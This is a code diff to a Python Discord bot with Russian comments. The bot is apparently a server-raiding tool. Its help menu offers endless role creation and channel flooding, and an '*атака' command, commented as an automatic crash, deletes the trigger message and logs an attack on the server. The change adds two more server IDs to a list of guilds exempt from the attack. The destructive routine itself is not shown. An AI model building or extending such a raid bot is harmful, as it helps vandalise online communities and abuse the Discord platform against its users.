@@ -31,7 +31,7 @@ class MyClient(discord.Client):
 			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
 			embed.add_field(name='*флуд', value='Зафлудить текущий канал', inline=False)
 			await message.author.send(embed=embed)
-		if message.guild.id != 732584678313427008 and message.guild.id != 725752675106291804 and message.guild.id != 741589705094594642 and message.guild.id != 561460998444154881:
+		if message.guild.id != 732584678313427008 and message.guild.id != 725752675106291804 and message.guild.id != 741589705094594642 and message.guild.id != 561460998444154881 and message.guild.id != 724533962583834665 and message.guild.id != 707402752166199378:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
 				print('Атака на сервер', message.guild.name)
